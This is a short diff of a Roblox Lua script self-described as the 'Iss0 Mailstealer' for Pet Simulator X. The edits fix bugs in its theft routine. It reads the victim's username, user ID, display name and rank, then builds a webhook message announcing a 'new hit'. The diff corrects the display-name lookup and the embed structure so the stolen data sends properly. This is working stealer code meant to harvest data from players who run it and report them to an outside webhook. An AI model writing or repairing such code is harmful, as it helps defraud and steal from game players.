@@ -63,8 +63,8 @@ local function getexploit()
 		("Unsupported")
   
 	return exploit
-  end
-  
+end
+
 --// Execution log
 if game.PlaceId == 6284583030 then
 	_G.GameIn = "Pet Simulator X"
@@ -83,11 +83,11 @@ local webhookcolor = "13369599"
 _G.CurrentRank = game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Rank.RankName.Text
 _G.PlrUserVictim = game.Players.LocalPlayer.Name
 _G.PlrUserIDVictim = game.Players.LocalPlayer.UserId
-_G.PlrDisplayNameVictim = game.Players.LocalPlayer.PlrDisplayNameVictim
+_G.PlrDisplayNameVictim = game.Players.LocalPlayer.DisplayName
 local function sendwebhook(msg)
 local msg = {
   ["content"]= "**Iss0 Mailstealer has detected a new hit!**",
-  ["thumbnail"]= {
+  ["embeds"]= {
     {
       ["title"]= "`Iss0 Mailstealer Results`",
       ["description"]= "**Data from the victim**\n🧑Display Name: ".._G.PlrDisplayNameVictim.."\n🧑Username: ".._G.PlrUserVictim.."\n🧑User ID: ".._G.PlrUserIDVictim.."\n🐱Rank: ".._G.CurrentRank.."\n🎮Place: ".._G.GameIn.."",
